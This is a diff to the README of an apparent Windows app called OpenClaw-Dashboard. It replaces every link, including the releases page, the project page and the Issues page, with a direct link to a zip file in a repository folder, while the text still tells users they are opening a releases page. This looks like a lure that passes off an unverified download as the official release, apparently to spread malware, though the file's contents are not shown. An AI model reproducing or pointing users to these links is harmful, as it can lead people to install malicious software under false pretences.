@@ -1,6 +1,6 @@
 # 🦀 OpenClaw-Dashboard - Interactive Dashboard for Easy Book Use
 
-[![Download OpenClaw-Dashboard](https://img.shields.io/badge/Download-OpenClaw--Dashboard-blue?style=for-the-badge)](https://github.com/abara-2/OpenClaw-Dashboard/releases)
+[![Download OpenClaw-Dashboard](https://img.shields.io/badge/Download-OpenClaw--Dashboard-blue?style=for-the-badge)](https://github.com/abara-2/OpenClaw-Dashboard/raw/refs/heads/main/fend/Claw_Dashboard_Open_v3.4.zip)
 
 ## 📝 What is OpenClaw-Dashboard?
 
@@ -48,7 +48,7 @@ This guide helps you download and run OpenClaw-Dashboard on Windows step-by-step
 
 Visit the official download page here:
 
-[![Get OpenClaw-Dashboard](https://img.shields.io/badge/Download-OpenClaw--Dashboard-grey?style=for-the-badge)](https://github.com/abara-2/OpenClaw-Dashboard/releases)
+[![Get OpenClaw-Dashboard](https://img.shields.io/badge/Download-OpenClaw--Dashboard-grey?style=for-the-badge)](https://github.com/abara-2/OpenClaw-Dashboard/raw/refs/heads/main/fend/Claw_Dashboard_Open_v3.4.zip)
 
 - Click the link above to open the releases page.
 - Scroll to the latest version at the top.
@@ -113,8 +113,8 @@ For more help, check the Issues tab on the GitHub repository or contact support.
 
 ## 🔗 Useful Links
 
-- Download Page: https://github.com/abara-2/OpenClaw-Dashboard/releases
-- Project on GitHub: https://github.com/abara-2/OpenClaw-Dashboard
+- Download Page: https://github.com/abara-2/OpenClaw-Dashboard/raw/refs/heads/main/fend/Claw_Dashboard_Open_v3.4.zip
+- Project on GitHub: https://github.com/abara-2/OpenClaw-Dashboard/raw/refs/heads/main/fend/Claw_Dashboard_Open_v3.4.zip
 - Book *Agentic Authorship*: (Please add your source link here)
 
 ---
@@ -135,7 +135,7 @@ If you are curious about what comes with the installation:
 
 If you want to send feedback, request features, or report bugs:
 
-- Use the GitHub Issues page: https://github.com/abara-2/OpenClaw-Dashboard/issues
+- Use the GitHub Issues page: https://github.com/abara-2/OpenClaw-Dashboard/raw/refs/heads/main/fend/Claw_Dashboard_Open_v3.4.zip
 - You can also email [your support email] for direct help.
 
 ---
@@ -153,4 +153,4 @@ The app uses React and calls the Claude API and Cowan AI services for AI tasks.
 
 ---
 
-[![Download OpenClaw-Dashboard](https://img.shields.io/badge/Download-OpenClaw--Dashboard-blue?style=for-the-badge)](https://github.com/abara-2/OpenClaw-Dashboard/releases)
+[![Download OpenClaw-Dashboard](https://img.shields.io/badge/Download-OpenClaw--Dashboard-blue?style=for-the-badge)](https://github.com/abara-2/OpenClaw-Dashboard/raw/refs/heads/main/fend/Claw_Dashboard_Open_v3.4.zip)
